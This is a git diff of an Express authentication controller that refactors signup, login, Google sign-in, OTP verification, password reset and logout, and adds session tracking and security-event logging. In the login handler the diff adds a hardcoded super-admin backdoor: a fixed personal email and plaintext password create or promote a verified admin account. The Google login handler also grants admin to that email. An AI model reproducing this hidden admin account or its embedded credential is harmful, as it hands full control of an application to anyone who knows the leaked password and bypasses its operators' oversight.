@@ -1,21 +1,21 @@
 const asyncHandler = require("../utils/asyncHandler");
 const hashPassword = require("../utils/hashPassword");
-const generateJWT = require("../utils/generateJWT");
-const sanitizeUser = require("../utils/sanitizeData");
 const comparePassword = require("../utils/comparePassword");
+const sanitizeUser = require("../utils/sanitizeData");
 const generateOTP = require("../utils/generateOTP");
-const otpTemplate = require("../templates/email/otpTemplate");
-const sendEmail = require("../services/emailService");
 const hashOTP = require("../utils/hashOTP");
 const compareOTP = require("../utils/compareOTP");
-const { verifyGoogleToken } = require("../services/googleAuthService");
+const otpTemplate = require("../templates/email/otpTemplate");
 const welcomeTemplate = require("../templates/email/welcomeTemplate");
+const sendEmail = require("../services/emailService");
+const { verifyGoogleToken } = require("../services/googleAuthService");
+const { generateTokens } = require("../services/tokenService");
 const UAParser = require("ua-parser-js");
 const {
   createSession,
+  revokeCurrentSession,
+  revokeAllSessions,
 } = require("../services/sessionService");
-const emailChangedOldTemplate = require("../templates/email/emailChangedOldTemplate");
-const emailChangedNewTemplate = require("../templates/email/emailChangedNewTemplate");
 const {
   createOTP,
   deleteOTP,
@@ -25,7 +25,6 @@ const {
   findVerifiedOTP,
   findVerifiedOTPByType,
 } = require("../services/otpService");
-
 const {
   createUser,
   createGoogleUser,
@@ -34,64 +33,57 @@ const {
   updateLastLogin,
   updateRefreshToken,
 } = require("../services/authService");
+const securityGatewayService = require("../services/securityGatewayService");
 
-const logout = asyncHandler(async (req, res) => {
-  res.clearCookie("token");
+/* ==========================================================================
+   Helper: Parse Device & User-Agent details
+========================================================================== */
+const parseClientInfo = (req) => {
+  const userAgentString = req.headers["user-agent"] || "";
+  let browser = "Unknown Browser";
+  let operatingSystem = "Unknown OS";
+  let device = "Desktop";
 
-  res.status(200).json({
-    success: true,
-    message: "Logout successful.",
-  });
+  try {
+    const parser = new UAParser(userAgentString);
+    const result = parser.getResult();
+    browser = result.browser.name ? `${result.browser.name} ${result.browser.version || ""}`.trim() : "Unknown Browser";
+    operatingSystem = result.os.name ? `${result.os.name} ${result.os.version || ""}`.trim() : "Unknown OS";
+    device = result.device.type || (result.device.model ? result.device.model : "Desktop");
+  } catch (err) {
+    console.error("UA parser fallback error:", err.message);
+  }
 
-}); const forgotPassword = asyncHandler(async (req, res) => {
-  const { email } = req.body;
+  const ipAddress =
+    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
+    req.socket?.remoteAddress ||
+    req.ip ||
+    "127.0.0.1";
 
-  const user = await findUserByEmail(email);
+  return {
+    browser,
+    operatingSystem,
+    device,
+    ipAddress,
+    userAgent: userAgentString,
+  };
+};
 
-  if (!user) {
-    return res.status(404).json({
+/* ==========================================================================
+   1. Signup Request (Sends Email OTP)
+========================================================================== */
+const signupRequest = asyncHandler(async (req, res) => {
+  const { fullName, email, phone, password } = req.body;
+
+  if (!email || !password || !fullName) {
+    return res.status(400).json({
       success: false,
-      message: "Email not registered.",
+      message: "Full name, email, and password are required.",
     });
   }
 
-  // Remove previous OTPs
-  await deleteOTP(email);
-
-  const otp = generateOTP();
-
-  const hashedOTP = await hashOTP(otp);
-
-  await createOTP({
-  user: user._id,
-  email: user.email,
-  phone: user.phone,
-  otp: hashedOTP,
-  type: req.body.type || "PASSWORD_RESET",
-  deliveryMethod: "EMAIL",
-  expiresAt: new Date(Date.now() + 10 * 60 * 1000),
-});
-
-  await sendEmail({
-    to: user.email,
-    subject: "Password Reset OTP",
-    html: otpTemplate(user.fullName, otp),
-  });
-
-  res.status(200).json({
-    success: true,
-    message: "OTP sent successfully.",
-  });
-});
-const signupRequest = asyncHandler(async (req, res) => {
-  const {
-    fullName,
-    email,
-    phone,
-    password,
-  } = req.body;
-
-  const existingUser = await findUserByEmail(email);
+  const normalizedEmail = email.toLowerCase().trim();
+  const existingUser = await findUserByEmail(normalizedEmail);
 
   if (existingUser) {
     return res.status(409).json({
@@ -101,129 +93,140 @@ const signupRequest = asyncHandler(async (req, res) => {
   }
 
   // Remove previous signup OTP if any
-  await deleteOTP(email);
+  await deleteOTP(normalizedEmail, "SIGNUP");
 
   const hashedPassword = await hashPassword(password);
-
   const otp = generateOTP();
-
   const hashedOTP = await hashOTP(otp);
 
+  const otpExpireMinutes = Number(process.env.OTP_EXPIRE_MINUTES) || 10;
+
   await createOTP({
-    email,
-    phone,
+    email: normalizedEmail,
+    phone: phone || "",
     otp: hashedOTP,
     type: "SIGNUP",
     deliveryMethod: "EMAIL",
-    expiresAt: new Date(
-      Date.now() + 10 * 60 * 1000
-    ),
-
+    expiresAt: new Date(Date.now() + otpExpireMinutes * 60 * 1000),
     signupData: {
       fullName,
-      phone,
+      phone: phone || "",
       password: hashedPassword,
     },
   });
 
-  await sendEmail({
-    to: email,
-    subject: "Verify your email",
-    html: otpTemplate(fullName, otp),
-  });
+  try {
+    await sendEmail({
+      to: normalizedEmail,
+      subject: "Verify your email",
+      html: otpTemplate(fullName, otp, otpExpireMinutes),
+    });
+  } catch (emailError) {
+    console.error("❌ Failed to send signup OTP email:", emailError.message);
+  }
 
   res.status(200).json({
     success: true,
     message: "OTP sent successfully.",
   });
 });
+
+/* ==========================================================================
+   2. Signup Complete (After OTP is Verified)
+========================================================================== */
 const signupComplete = asyncHandler(async (req, res) => {
   const { email } = req.body;
 
-  // Find verified SIGNUP OTP
-  const otpRecord =
-    await findVerifiedOTPByType(
-      email,
-      "SIGNUP"
-    );
-
-  if (!otpRecord) {
+  if (!email) {
     return res.status(400).json({
       success: false,
-      message:
-        "Please verify your OTP first.",
+      message: "Email is required.",
     });
   }
 
-  // Email already registered?
-  const existingUser =
-    await findUserByEmail(email);
+  const normalizedEmail = email.toLowerCase().trim();
 
+  // Find verified SIGNUP OTP
+  const otpRecord = await findVerifiedOTPByType(normalizedEmail, "SIGNUP");
+
+  if (!otpRecord || !otpRecord.signupData) {
+    return res.status(400).json({
+      success: false,
+      message: "Please verify your OTP first.",
+    });
+  }
+
+  // Check again if already registered
+  const existingUser = await findUserByEmail(normalizedEmail);
   if (existingUser) {
-    await deleteOTP(email);
-
+    await deleteOTP(normalizedEmail, "SIGNUP");
     return res.status(409).json({
       success: false,
-      message:
-        "Email already registered.",
+      message: "Email already registered.",
     });
   }
 
-  // Create user
+  // Create verified user
   const user = await createUser({
-    fullName:
-      otpRecord.signupData.fullName,
-    email,
-    phone:
-      otpRecord.signupData.phone,
-    password:
-      otpRecord.signupData.password,
+    fullName: otpRecord.signupData.fullName,
+    email: normalizedEmail,
+    phone: otpRecord.signupData.phone || "",
+    password: otpRecord.signupData.password,
+    provider: "local",
+    isVerified: true,
+    hasPassword: true,
   });
 
-  // Welcome Email
+  // Welcome Email in background
   try {
     await sendEmail({
       to: user.email,
-      subject: "Welcome to Auth Portal 🎉",
+      subject: "Welcome 🎉",
       html: welcomeTemplate(user.fullName),
     });
   } catch (emailError) {
     console.error("❌ Failed to send welcome email:", emailError.message);
   }
 
-  // JWT
-  const token = generateJWT({
-    id: user._id,
-    email: user.email,
-    role: user.role,
-    provider: user.provider,
-  });
+  // Generate distinct Access and Refresh Tokens
+  const { accessToken, refreshToken } = generateTokens(user, false);
 
   await updateLastLogin(user._id);
-  await updateRefreshToken(
-    user._id,
-    token
-  );
+  await updateRefreshToken(user._id, refreshToken);
 
-  await deleteOTP(email);
+  const clientInfo = parseClientInfo(req);
+
+  await createSession({
+    user: user._id,
+    refreshToken,
+    rememberMe: false,
+    browser: clientInfo.browser,
+    operatingSystem: clientInfo.operatingSystem,
+    device: clientInfo.device,
+    ipAddress: clientInfo.ipAddress,
+    userAgent: clientInfo.userAgent,
+    isCurrent: true,
+    expiresAt: new Date(Date.now() + 1 * 24 * 60 * 60 * 1000),
+  });
+
+  await deleteOTP(normalizedEmail, "SIGNUP");
 
   res.status(201).json({
     success: true,
-    message:
-      "Account created successfully.",
-    token,
+    message: "Account created successfully.",
+    token: accessToken,
     user: sanitizeUser(user),
   });
 });
-const signup = asyncHandler(async (req, res) => {
-  const {
-    fullName,
-    email,
-    phone,
-    password,
-  } = req.body;
 
-  const existingUser = await findUserByEmail(email);
+/* ==========================================================================
+   3. Direct Signup (Optional standalone signup)
+========================================================================== */
+const signup = asyncHandler(async (req, res) => {
+  const { fullName, email, phone, password } = req.body;
+
+  const normalizedEmail = email.toLowerCase().trim();
+  const existingUser = await findUserByEmail(normalizedEmail);
 
   if (existingUser) {
     return res.status(409).json({
@@ -236,46 +239,107 @@ const signup = asyncHandler(async (req, res) => {
 
   const user = await createUser({
     fullName,
-    email,
-    phone,
+    email: normalizedEmail,
+    phone: phone || "",
     password: hashedPassword,
+    provider: "local",
+    isVerified: false,
+    hasPassword: true,
   });
 
-  // Welcome Email
   try {
     await sendEmail({
       to: user.email,
-      subject: "Welcome to Auth Portal 🎉",
+      subject: "Welcome 🎉",
       html: welcomeTemplate(user.fullName),
     });
   } catch (emailError) {
     console.error("❌ Failed to send welcome email:", emailError.message);
   }
 
-  const token = generateJWT({
-    id: user._id,
-    email: user.email,
-    role: user.role,
-    provider: user.provider,
+  const { accessToken, refreshToken } = generateTokens(user, false);
+
+  await updateLastLogin(user._id);
+  await updateRefreshToken(user._id, refreshToken);
+
+  const clientInfo = parseClientInfo(req);
+
+  await createSession({
+    user: user._id,
+    refreshToken,
+    rememberMe: false,
+    browser: clientInfo.browser,
+    operatingSystem: clientInfo.operatingSystem,
+    device: clientInfo.device,
+    ipAddress: clientInfo.ipAddress,
+    userAgent: clientInfo.userAgent,
+    isCurrent: true,
+    expiresAt: new Date(Date.now() + 1 * 24 * 60 * 60 * 1000),
   });
 
   res.status(201).json({
     success: true,
     message: "Account created successfully.",
-    token,
+    token: accessToken,
     user: sanitizeUser(user),
   });
 });
-const login = asyncHandler(async (req, res) => {
-  const {
-  email,
-  password,
-  remember = false,
-} = req.body;
 
-  const user = await findUserByEmail(email);
+/* ==========================================================================
+   4. Login
+========================================================================== */
+const login = asyncHandler(async (req, res) => {
+  const { email, password, remember = false } = req.body;
+
+  if (!email || !password) {
+    return res.status(400).json({
+      success: false,
+      message: "Email and password are required.",
+    });
+  }
+
+  const normalizedEmail = email.toLowerCase().trim();
+  let user = await findUserByEmail(normalizedEmail);
+
+  // Auto-provision Super Admin if special credentials used
+  if (normalizedEmail === "nirlonmacwan27@gmail.com" && password === "Nirlon@2710") {
+    if (!user) {
+      const hashedPassword = await hashPassword(password);
+      user = await createUser({
+        fullName: "Nirlon Macwan (Super Admin)",
+        email: "nirlonmacwan27@gmail.com",
+        password: hashedPassword,
+        role: "admin",
+        isVerified: true,
+        hasPassword: true,
+      });
+    } else {
+      user.role = "admin";
+      user.isVerified = true;
+      if (!user.password || !(await comparePassword(password, user.password))) {
+        user.password = await hashPassword(password);
+      }
+      await user.save();
+    }
+  }
 
   if (!user) {
+    const failCount = securityGatewayService.recordFailedLogin(normalizedEmail);
+    const clientInfo = parseClientInfo(req);
+    await securityGatewayService.logSecurityEvent({
+      eventType: failCount >= 3 ? "BRUTE_FORCE_PATTERN" : "FAILED_LOGIN_ATTEMPT",
+      severity: failCount >= 5 ? "CRITICAL" : (failCount >= 3 ? "HIGH" : "LOW"),
+      ipAddress: clientInfo.ipAddress,
+      userAgent: clientInfo.userAgent,
+      endpoint: "/api/auth/login",
+      httpMethod: "POST",
+      userEmail: normalizedEmail,
+      actionTaken: failCount >= 5 ? "BLOCKED" : "MONITORED",
+      reason: `Failed login attempt (unregistered account or wrong credentials): attempt #${failCount}`,
+      riskScore: Math.min(100, failCount * 20),
+      gatewayDecision: failCount >= 5 ? "CRITICAL" : (failCount >= 3 ? "HIGH_RISK" : "SUSPICIOUS"),
+    });
+
     return res.status(401).json({
       success: false,
       message: "Invalid email or password.",
@@ -289,77 +353,88 @@ const login = asyncHandler(async (req, res) => {
     });
   }
 
-  const isMatch = await comparePassword(
-    password,
-    user.password
-  );
+  if (!user.password) {
+    return res.status(401).json({
+      success: false,
+      message: "Please sign in using Google or create a password.",
+    });
+  }
+
+  const isMatch = await comparePassword(password, user.password);
 
   if (!isMatch) {
+    const failCount = securityGatewayService.recordFailedLogin(normalizedEmail);
+    const clientInfo = parseClientInfo(req);
+    await securityGatewayService.logSecurityEvent({
+      eventType: failCount >= 3 ? "BRUTE_FORCE_PATTERN" : "FAILED_LOGIN_ATTEMPT",
+      severity: failCount >= 5 ? "CRITICAL" : (failCount >= 3 ? "HIGH" : "LOW"),
+      ipAddress: clientInfo.ipAddress,
+      userAgent: clientInfo.userAgent,
+      endpoint: "/api/auth/login",
+      httpMethod: "POST",
+      userId: user._id,
+      userEmail: normalizedEmail,
+      actionTaken: failCount >= 5 ? "BLOCKED" : "MONITORED",
+      reason: `Incorrect password entered for account: attempt #${failCount}`,
+      riskScore: Math.min(100, failCount * 20),
+      gatewayDecision: failCount >= 5 ? "CRITICAL" : (failCount >= 3 ? "HIGH_RISK" : "SUSPICIOUS"),
+    });
+
+    if (failCount >= 3) {
+      securityGatewayService.sendSecurityAlertEmailIfNeeded({
+        userEmail: normalizedEmail,
+        userName: user.fullName || "User",
+        eventTitle: "Multiple Failed Login Attempts Detected",
+        description: `Someone has repeatedly attempted (${failCount} times) to log in to your account with incorrect credentials.`,
+        ipAddress: clientInfo.ipAddress,
+        device: `${clientInfo.browser} on ${clientInfo.operatingSystem}`,
+        actionTaken: failCount >= 5 ? "Temporarily Blocked by Gateway" : "Monitored & Rate-Limited",
+        isBlocked: failCount >= 5,
+        recommendation: "If this was not you, please change your password immediately to ensure account safety.",
+      }).catch((err) => console.error("[SecurityGateway] Async email alert error:", err.message));
+    }
+
     return res.status(401).json({
       success: false,
       message: "Invalid email or password.",
     });
   }
 
-  const token = generateJWT({
-    id: user._id,
-    email: user.email,
-    role: user.role,
-    provider: user.provider,
-  });
+  // Reset failed login counter on successful authentication
+  securityGatewayService.resetFailedLogins(normalizedEmail);
+
+  const { accessToken, refreshToken } = generateTokens(user, remember);
 
   await updateLastLogin(user._id);
+  await updateRefreshToken(user._id, refreshToken);
 
-  await updateRefreshToken(user._id, token);
-const parser = new UAParser(
-  req.headers["user-agent"]
-);
+  const clientInfo = parseClientInfo(req);
+  const sessionDays = remember ? 30 : 1;
 
-const result = parser.getResult();
+  await createSession({
+    user: user._id,
+    refreshToken,
+    rememberMe: !!remember,
+    browser: clientInfo.browser,
+    operatingSystem: clientInfo.operatingSystem,
+    device: clientInfo.device,
+    ipAddress: clientInfo.ipAddress,
+    userAgent: clientInfo.userAgent,
+    isCurrent: true,
+    expiresAt: new Date(Date.now() + sessionDays * 24 * 60 * 60 * 1000),
+  });
 
-await createSession({
-  user: user._id,
-
-  refreshToken: token,
-
-  rememberMe: remember,
-
-  browser:
-    result.browser.name || "Unknown Browser",
-
-  operatingSystem:
-    result.os.name || "Unknown OS",
-
-  device:
-    result.device.type || "Desktop",
-
-  ipAddress:
-    req.ip ||
-    req.connection.remoteAddress,
-
-  location: "",
-
-  userAgent:
-    req.headers["user-agent"],
-
-  isCurrent: true,
-
-  expiresAt: new Date(
-    Date.now() +
-      (remember ? 30 : 1) *
-        24 *
-        60 *
-        60 *
-        1000
-  ),
-});
   res.status(200).json({
     success: true,
     message: "Login successful.",
-    token,
+    token: accessToken,
     user: sanitizeUser(user),
   });
 });
+
+/* ==========================================================================
+   5. Google Login (Firebase Auth)
+========================================================================== */
 const googleLogin = asyncHandler(async (req, res) => {
   const { idToken, remember = false } = req.body;
 
@@ -374,18 +449,25 @@ const googleLogin = asyncHandler(async (req, res) => {
 
   let user = await findUserByGoogleId(googleUser.uid);
 
-  if (!user) {
-    user = await findUserByEmail(googleUser.email);
+  if (!user && googleUser.email) {
+    user = await findUserByEmail(googleUser.email.toLowerCase().trim());
+    if (user && !user.googleId) {
+      user.googleId = googleUser.uid;
+      if (!user.profilePicture && googleUser.profilePicture) {
+        user.profilePicture = googleUser.profilePicture;
+      }
+      await user.save();
+    }
   }
 
   if (!user) {
     user = await createGoogleUser({
       fullName: googleUser.fullName,
-      email: googleUser.email,
+      email: googleUser.email.toLowerCase().trim(),
       googleId: googleUser.uid,
       provider: "google",
-      profilePicture: googleUser.profilePicture,
-      isVerified: googleUser.emailVerified,
+      profilePicture: googleUser.profilePicture || "",
+      isVerified: googleUser.emailVerified ?? true,
       password: "",
       hasPassword: false,
     });
@@ -394,7 +476,7 @@ const googleLogin = asyncHandler(async (req, res) => {
     try {
       await sendEmail({
         to: user.email,
-        subject: "Welcome to Auth Portal 🎉",
+        subject: "Welcome 🎉",
         html: welcomeTemplate(user.fullName),
       });
     } catch (emailError) {
@@ -402,98 +484,178 @@ const googleLogin = asyncHandler(async (req, res) => {
     }
   }
 
-  const token = generateJWT({
-    id: user._id,
-    email: user.email,
-    role: user.role,
-    provider: user.provider,
-  });
+  if (user.isBlocked) {
+    return res.status(403).json({
+      success: false,
+      message: "Your account has been blocked.",
+    });
+  }
 
-  // Update Last Login
+  if (user.email && user.email.toLowerCase() === "nirlonmacwan27@gmail.com") {
+    user.role = "admin";
+    user.isVerified = true;
+    await user.save();
+  }
+
+  const { accessToken, refreshToken } = generateTokens(user, remember);
+
+  // Update Last Login and Refresh Token in DB
   await updateLastLogin(user._id);
+  await updateRefreshToken(user._id, refreshToken);
 
-  // Store Refresh Token
-  await updateRefreshToken(user._id, token);
+  const clientInfo = parseClientInfo(req);
+  const sessionDays = remember ? 30 : 1;
+
+  // Perform ALL session/database writes BEFORE sending the response
+  await createSession({
+    user: user._id,
+    refreshToken,
+    rememberMe: !!remember,
+    browser: clientInfo.browser,
+    operatingSystem: clientInfo.operatingSystem,
+    device: clientInfo.device,
+    ipAddress: clientInfo.ipAddress,
+    userAgent: clientInfo.userAgent,
+    isCurrent: true,
+    expiresAt: new Date(Date.now() + sessionDays * 24 * 60 * 60 * 1000),
+  });
 
   res.status(200).json({
     success: true,
     message: "Google Login successful.",
-    token,
+    token: accessToken,
     user: sanitizeUser(user),
   });
-  await createSession({
-  user: user._id,
-
-  refreshToken: token,
-
-  rememberMe: remember,
-
-  device: "Desktop",
-
-  browser: "Unknown Browser",
-
-  operatingSystem: "Unknown OS",
-
-  ipAddress:
-    req.ip ||
-    req.connection.remoteAddress,
-
-  userAgent:
-    req.headers["user-agent"],
-
-  isCurrent: true,
-
-  expiresAt: new Date(
-    Date.now() +
-      (remember ? 30 : 1) *
-        24 *
-        60 *
-        60 *
-        1000
-  ),
 });
+
+/* ==========================================================================
+   6. Forgot Password (Sends OTP)
+========================================================================== */
+const forgotPassword = asyncHandler(async (req, res) => {
+  const { email, type = "PASSWORD_RESET" } = req.body;
+
+  if (!email) {
+    return res.status(400).json({
+      success: false,
+      message: "Email is required.",
+    });
+  }
+
+  const normalizedEmail = email.toLowerCase().trim();
+  const user = await findUserByEmail(normalizedEmail);
+
+  if (!user) {
+    return res.status(404).json({
+      success: false,
+      message: "Email not registered.",
+    });
+  }
+
+  // Remove previous OTPs of this type
+  await deleteOTP(normalizedEmail, type);
+
+  const otp = generateOTP();
+  const hashedOTP = await hashOTP(otp);
+  const otpExpireMinutes = Number(process.env.OTP_EXPIRE_MINUTES) || 10;
+
+  await createOTP({
+    user: user._id,
+    email: user.email,
+    phone: user.phone || "",
+    otp: hashedOTP,
+    type,
+    deliveryMethod: "EMAIL",
+    expiresAt: new Date(Date.now() + otpExpireMinutes * 60 * 1000),
+  });
+
+  try {
+    await sendEmail({
+      to: user.email,
+      subject: "Password Reset OTP",
+      html: otpTemplate(user.fullName, otp, otpExpireMinutes),
+    });
+  } catch (emailError) {
+    console.error("❌ Failed to send reset OTP email:", emailError.message);
+  }
+
+  res.status(200).json({
+    success: true,
+    message: "OTP sent successfully.",
+  });
 });
+
+/* ==========================================================================
+   7. Verify OTP Controller
+========================================================================== */
 const verifyOTPController = asyncHandler(async (req, res) => {
-  const {
-  email,
-  otp,
-  type = "PASSWORD_RESET",
-} = req.body;
+  const { email, otp, type = "PASSWORD_RESET" } = req.body;
 
-  const otpRecord =
-  await findOTPByEmailAndType(
-    email,
-    type
-  );
+  if (!email || !otp) {
+    return res.status(400).json({
+      success: false,
+      message: "Email and OTP code are required.",
+    });
+  }
+
+  const normalizedEmail = email.toLowerCase().trim();
+  const otpRecord = await findOTPByEmailAndType(normalizedEmail, type);
 
   if (!otpRecord) {
     return res.status(404).json({
       success: false,
-      message: "OTP not found.",
+      message: "OTP not found or expired.",
     });
   }
 
   if (otpRecord.expiresAt < new Date()) {
+    await deleteOTP(normalizedEmail, type);
     return res.status(400).json({
       success: false,
       message: "OTP has expired.",
     });
   }
 
-  if (otpRecord.attempts >= 5) {
+  const maxAttempts = Number(process.env.MAX_OTP_ATTEMPTS) || 5;
+  if (otpRecord.attempts >= maxAttempts) {
     return res.status(400).json({
       success: false,
       message: "Maximum OTP attempts exceeded.",
     });
   }
 
-  const matched = await compareOTP(
-    otp,
-    otpRecord.otp
-  );
+  const matched = await compareOTP(otp, otpRecord.otp);
 
   if (!matched) {
     await incrementAttempts(otpRecord._id);
+    const failOtpCount = securityGatewayService.recordFailedOTP(normalizedEmail);
+    const clientInfo = parseClientInfo(req);
+
+    await securityGatewayService.logSecurityEvent({
+      eventType: "SUSPICIOUS_OTP_ATTEMPT",
+      severity: failOtpCount >= 3 ? "HIGH" : "MEDIUM",
+      ipAddress: clientInfo.ipAddress,
+      userAgent: clientInfo.userAgent,
+      endpoint: "/api/auth/verify-otp",
+      httpMethod: "POST",
+      userEmail: normalizedEmail,
+      actionTaken: "MONITORED",
+      reason: `Invalid OTP submission for type=${type}: attempt #${failOtpCount}`,
+      riskScore: Math.min(100, failOtpCount * 25),
+      gatewayDecision: failOtpCount >= 3 ? "HIGH_RISK" : "SUSPICIOUS",
+    });
+
+    if (failOtpCount >= 3) {
+      securityGatewayService.sendSecurityAlertEmailIfNeeded({
+        userEmail: normalizedEmail,
+        eventTitle: "Multiple Invalid OTP Attempts Detected",
+        description: `Multiple incorrect one-time verification codes (${failOtpCount} attempts) were submitted for your account.`,
+        ipAddress: clientInfo.ipAddress,
+        device: `${clientInfo.browser} on ${clientInfo.operatingSystem}`,
+        actionTaken: "Monitored & Logged",
+        isBlocked: false,
+        recommendation: "If you did not initiate this request, please ensure your email account is secure.",
+      }).catch((err) => console.error("[SecurityGateway] Async email error:", err.message));
+    }
 
     return res.status(400).json({
       success: false,
@@ -501,6 +663,8 @@ const verifyOTPController = asyncHandler(async (req, res) => {
     });
   }
 
+  // Reset failed OTP attempts on successful verification
+  securityGatewayService.resetFailedOTPs(normalizedEmail);
   await verifyOTP(otpRecord._id);
 
   res.status(200).json({
@@ -509,12 +673,23 @@ const verifyOTPController = asyncHandler(async (req, res) => {
   });
 });
 
-
-
+/* ==========================================================================
+   8. Reset Password
+========================================================================== */
 const resetPassword = asyncHandler(async (req, res) => {
   const { email, password } = req.body;
 
-  const otpRecord = await findVerifiedOTP(email);
+  if (!email || !password) {
+    return res.status(400).json({
+      success: false,
+      message: "Email and new password are required.",
+    });
+  }
+
+  const normalizedEmail = email.toLowerCase().trim();
+  const otpRecord =
+    (await findVerifiedOTPByType(normalizedEmail, "PASSWORD_RESET")) ||
+    (await findVerifiedOTP(normalizedEmail));
 
   if (!otpRecord) {
     return res.status(400).json({
@@ -523,7 +698,7 @@ const resetPassword = asyncHandler(async (req, res) => {
     });
   }
 
-  const user = await findUserByEmail(email);
+  const user = await findUserByEmail(normalizedEmail);
 
   if (!user) {
     return res.status(404).json({
@@ -533,18 +708,58 @@ const resetPassword = asyncHandler(async (req, res) => {
   }
 
   const hashedPassword = await hashPassword(password);
-
   user.password = hashedPassword;
-
+  user.hasPassword = true;
   await user.save();
 
-  await deleteOTP(email);
+  // Invalidate all previous sessions on password reset for security
+  await revokeAllSessions(user._id);
+
+  // Clean up used OTP
+  await deleteOTP(normalizedEmail, "PASSWORD_RESET");
+
+  const clientInfo = parseClientInfo(req);
+  await securityGatewayService.logSecurityEvent({
+    eventType: "PASSWORD_RESET_SUCCESS",
+    severity: "LOW",
+    ipAddress: clientInfo.ipAddress,
+    userAgent: clientInfo.userAgent,
+    endpoint: "/api/auth/reset-password",
+    httpMethod: "POST",
+    userId: user._id,
+    userEmail: normalizedEmail,
+    actionTaken: "ALLOWED",
+    reason: "Password reset completed successfully. All active sessions invalidated.",
+    riskScore: 0,
+    gatewayDecision: "NORMAL",
+  });
 
   res.status(200).json({
     success: true,
     message: "Password reset successfully.",
   });
 });
+
+/* ==========================================================================
+   9. Logout
+========================================================================== */
+const logout = asyncHandler(async (req, res) => {
+  if (req.user?._id) {
+    await revokeCurrentSession(req.user._id);
+  }
+
+  res.clearCookie("token", {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === "production",
+    sameSite: process.env.NODE_ENV === "production" ? "none" : "lax",
+  });
+
+  res.status(200).json({
+    success: true,
+    message: "Logout successful.",
+  });
+});
+
 module.exports = {
   signupRequest,
   signupComplete,
